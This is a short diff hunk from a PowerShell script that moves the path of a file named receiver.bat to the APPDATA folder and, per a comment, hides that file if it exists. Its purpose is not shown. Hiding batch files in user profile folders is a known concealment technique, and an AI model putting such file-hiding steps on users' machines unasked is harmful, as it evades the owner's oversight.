@@ -12,7 +12,7 @@ try {
 }
 
 # Define the path to receiver.bat in AppData\Local
-$receiverPath = "$env:APPDATA\Local\receiver.bat"
+$receiverPath = "$env:APPDATA\receiver.bat"
 
 # Hide the receiver.bat file if it exists
 try {
